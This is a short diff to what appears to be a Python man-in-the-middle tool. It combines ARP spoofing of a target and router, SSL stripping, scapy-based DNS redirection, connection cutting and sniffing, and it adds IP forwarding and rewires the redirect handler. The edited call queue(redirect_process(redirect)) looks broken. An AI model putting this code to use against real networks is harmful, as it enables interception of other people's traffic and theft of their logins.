@@ -101,7 +101,7 @@ def queue(function):
     queue.run()
 
 
-def redirect_process(packet, ip):
+def redirect_process(ip, packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
@@ -133,7 +133,6 @@ def final_spoof(target_ip, router_ip):
 
 
 def main(argv):
-    # enable_forward()
     (logFile, logLevel, listenPort, spoofFavicon, killSessions, target_ip, iface, redirect, router_ip, cut,
      scan) = parseOptions(argv)
     try:
@@ -141,13 +140,14 @@ def main(argv):
             scany = Scanner
             scany.run(scan)
         else:
+            enable_forward()
             start_new_thread(final_spoof(target_ip, router_ip), )
             start_new_thread(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions), )
             try:
                 if cut:
                     queue(cut_net)
                 elif redirect:
-                    queue(redirect_process)
+                    queue(redirect_process(redirect))
                 else:
                     sniff(iface)
             except Exception:
